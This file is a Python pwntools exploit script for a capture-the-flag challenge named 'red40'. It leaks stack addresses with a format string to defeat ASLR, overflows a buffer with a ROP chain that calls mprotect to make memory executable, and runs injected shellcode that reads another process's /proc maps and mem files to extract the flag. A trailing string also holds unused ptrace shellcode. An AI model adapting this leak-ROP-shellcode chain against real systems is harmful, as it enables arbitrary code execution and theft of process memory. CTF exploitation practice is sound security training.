from pwn import *
from sys import argv

os.chdir(os.path.join(os.path.dirname(__file__), 'red40'))

libc = ELF('libc/libc.so.6')

mainret_offset = libc.functions['__libc_start_main'].address - 0xe40 + 0xd90 + 128
mprotect_offset = libc.functions['mprotect'].address
gets_offset = libc.functions['gets'].address
printf_offset = libc.functions['printf'].address
puts_offset = libc.functions['puts'].address
write_offset = libc.functions['write'].address
wait_offset = libc.functions['wait'].address
perror_offset = libc.functions['perror'].address
atoll_offset = libc.functions['atoll'].address



context.log_level = 'debug'
context.arch = 'amd64'

# print(asm('pop rdi; ret').hex())


conn = remote('red40.ctf.umasscybersec.org', 1337) if 'r' in argv else process('./parent')
# WARN
conn.sendlineafter(b'> ', b'3')

# 6 local_38, 
# 189a,
conn.sendlineafter(b'>\n', b'%13$p,%21$p')

if 'r' not in argv:
    context.terminal = ['tmux', 'splitw', '-h', '-l', '80%']
    try:
        childpid = int(os.popen('ps -eo pid,fname|grep red40').read().split(' ')[0])

        gdb.attach(childpid, '''
b *$rebase(0x182b)
b *$rebase(0x4100)
''', exe='red40')
    except: 
        pass

warnget_ret, main_ret = [int(s[2:], 16) for s in conn.recvline(keepends=False).decode().split(',')]
PIE = warnget_ret - 0x189a
if 'r' in sys.argv:
    PIE = warnget_ret - 0x189a + 0xc + 0x189a - 0xc + 0x77 + 7 + 0xbec - 0x2330

LIBC = main_ret - mainret_offset
print(f"PIE: {PIE:x}, LIBC: {LIBC:x}")

pop_rdi_gadget = LIBC + 0x1731e3
pop_rsi_gadget = LIBC + 0x7f88441d9e81 - 0x7f8844064000
pop_rdx_r12_gadget = LIBC + 0x11f2e7
pop_rcx_gadget = LIBC + 0x7f88440a11ee - 0x7f8844064000
pop_rax_gadget = LIBC + 0x45eb0
syscall_gadget = LIBC + 0x29db4

BSS = PIE + 0x5000
SC_BASE = BSS + 0x100

payload_print_code = p64(pop_rsi_gadget) + p64(SC_BASE) + p64(pop_rdi_gadget) + p64(0) + p64(pop_rdx_r12_gadget) + p64(0x100) + p64(0) + p64(LIBC + write_offset)

payload_mprotect = p64(pop_rdi_gadget) + p64(BSS) + p64(pop_rsi_gadget) + p64(0x1000) + p64(pop_rdx_r12_gadget) + p64(7) + p64(0) + p64(LIBC + mprotect_offset)
payload_read = p64(pop_rdi_gadget) + p64(SC_BASE) + p64(LIBC + gets_offset)
payload_x32 = p64(pop_rax_gadget) + p64(0X400000000 + 59) + p64(pop_rdi_gadget) + p64(SC_BASE) + p64(pop_rsi_gadget) + p64(0) + p64(pop_rdx_r12_gadget) + p64(0) * 2 + p64(syscall_gadget)

time.sleep(.2)

# conn.sendlineafter(b'DO YOU HAVE ANYTHING ELSE TO SAY TO THE RED40?????\n> ', 
#                    b'A' * 0x38 + payload_print_code)
# code = conn.recv(0x100)
# print(code)

conn.sendlineafter(b'DO YOU HAVE ANYTHING ELSE TO SAY TO THE RED40?????\n> ', 
                   b'A' * 0x38 + payload_mprotect + payload_read + payload_print_code + p64(SC_BASE))
sc = f'''
//dup2
mov rdi, 1
mov rsi, 2
mov rax, 33
syscall

// getppid
mov rax, 110
syscall
push rax

// print ppid
mov rsi, rax
mov rax, {LIBC + printf_offset}
mov rdi, {PIE + 0x2425}
call rax

// cat (*) (/proc/[ppid]/maps)
mov rdi, {BSS + 0x800}
mov rax, {LIBC + gets_offset}
call rax

mov rdi, {BSS + 0x800}
mov rsi, 0
mov rdx, 0
mov rax, 2
syscall

mov rdi, rax
mov rax, 0
mov rsi, {BSS + 0x800}
mov rdx, 0x300
syscall

mov rax, {LIBC + puts_offset}
mov rdi, {BSS + 0x800}
call rax

// cat+lseek (*) (/proc/[ppid]/maps)
mov rdi, {BSS + 0x800}
mov rax, {LIBC + gets_offset}
call rax

mov rdi, {BSS + 0x800}
mov rsi, 0
mov rdx, 0
mov rax, 2
syscall
push rax

cmp rax, 0
je error

mov rdi, {BSS + 0x800}
mov rax, {LIBC + gets_offset}
call rax

mov rdi, {BSS + 0x800}
mov rax, {LIBC + atoll_offset}
call rax
// lseek
pop rdi
push rdi
mov rsi, rax
mov rax, 8
mov rdx, 0x0
syscall
// read
pop rdi
push rdi
mov rax, 0
mov rsi, {BSS + 0x800}
mov rdx, 0x300
syscall
// write
mov rdi, 1
mov rax, 1
mov rsi, {BSS + 0x800}
mov rdx, 0x300
syscall

end:
mov rax, {LIBC + puts_offset}
mov rdi, {PIE + 0x2168}
call rax

hlt

error:
mov rax, {LIBC + puts_offset}
mov rdi, {PIE + 0x2288}
call rax
'''
getshell = asm(sc)
conn.sendline(getshell)

conn.recvuntil(b'Count: ')
ppid = int(conn.recvline(keepends=False).decode())
print('PPID:', ppid)
# proc fs exists
conn.sendline(f'/proc/{ppid}/maps'.encode())
heap_line = conn.recvline_contains(b'[heap]', keepends=False).decode()
heap_start = int(heap_line.split('-')[0], 16)

conn.sendline(f'/proc/{ppid}/mem'.encode())
conn.sendline(f'{heap_start}'.encode())

conn.recvuntil(b'UMASS')
flag = (b'UMASS' + conn.recvuntil(b'}')).decode()
print(flag)


conn.interactive()
# UMASS{r0j0_4d_k33p!n6_y0u_r1ch_4$_h3ck!}


'''
// NOT USED PTRACE
// PTRACE_ATTACH=16
pop rsi
push rsi
mov rdi, 16
mov rax, 101
mov rdx, 0
mov rcx, 0
syscall

// print ret
mov rsi, rax
mov rax, {LIBC + printf_offset}
mov rdi, {PIE + 0x2425}
call rax

// wait
mov rdi, {BSS + 0x800}
mov rax, {LIBC + wait_offset}
call rax

// PTRACE_GETREGS=12
pop rsi
push rsi
mov rdi, 12
mov rax, 101
mov rdx, {BSS + 0x800}
mov rcx, {BSS + 0x800}
syscall

// print ret
mov rsi, rax
mov rax, {LIBC + printf_offset}
mov rdi, {PIE + 0x2425}
call rax

// perror
mov rdi, {PIE + 0x20a1}
mov rax, {LIBC + perror_offset}
call rax

mov rdi, 1
mov rsi, {BSS + 0x800}
mov rdx, 0xa0
mov rax, 1
syscall

mov rsi, rax
mov rax, {LIBC + printf_offset}
mov rdi, {PIE + 0x2425}
call rax

mov rax, {LIBC + puts_offset}
mov rdi, {PIE + 0x2425}
call rax
'''